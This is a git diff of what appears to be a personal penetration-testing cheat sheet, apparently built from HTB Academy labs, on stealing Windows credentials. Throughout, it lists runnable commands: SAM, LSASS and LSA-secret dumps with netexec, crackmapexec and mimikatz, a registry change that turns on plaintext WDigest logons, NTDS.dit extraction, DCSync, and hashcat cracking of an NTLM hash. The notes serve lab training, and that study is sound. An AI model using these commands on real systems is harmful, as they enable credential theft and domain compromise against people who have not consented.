@@ -33,8 +33,9 @@ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam #
 mimikatz.exe "privilege::debug" "lsadump::sam" exit
 
 # with netexec
-nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
-nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump #  if fail try this old method (similar to secretdump)
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam --local-auth
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump --local-auth #  if fail try this old method (similar to secretdump)
+
 
 ```
 ## Attacking LSASS
@@ -75,14 +76,16 @@ reg add "HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest" /v Use
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" # check , UseLogonCredential  REG_DWORD  0x1
 shutdown /r /t 0 /f # Reboot required
 # Dump creds with Mimikatz
-sekurlsa::logonpasswords   # all creds + plain text
-sekurlsa::wdigest          # WDigest creds only
-
+sekurlsa::logonpasswords   # LSASS (all creds + plain text)
+sekurlsa::wdigest          # LSASS WDigest creds only
 # with netexec
 nxc smb victim -u ‘’ -p ‘’ -M lsassy
-netexec smb MS01 -u <user> -p "<pass>" -M nanodump # better
+netexec smb MS01 -u <user> -p "<pass>" -M nanodump --local-auth# better
 
-
+# LSA = the security authority (concept + secrets on disk / registry)
+# LSASS = the process (lsass.exe) that runs LSA in memor
+lsadump::secrets # LSA 
+crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa --local-auth # LSA
 ```
 
 ## Attacking Windows Credential Manager
@@ -180,9 +183,12 @@ netexec smb MS01 -u <user> -p "<pass>" -M nanodump # better
 ### A Faster Method: Using cme to Capture NTDS.dit
     crackmapexec smb 10.129.201.57 -u <username> -p P@55w0rd! --ntds
 
+
 ###  another Method: Using mimikatz:
-lsadump::ntds /system:<SYSTEM> /ntds:<ntds.dit>
+lsadump::ntds /system:<SYSTEM> /ntds:<ntds.dit> # need local admin priv
 lsadump::dcsync /domain:<DOMAIN.LOCAL> /user:<DOMAIN>\administrator # need domain admin privileges.
+
+  
   
 ###  Cracking a Single Hash with Hashcat
     sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
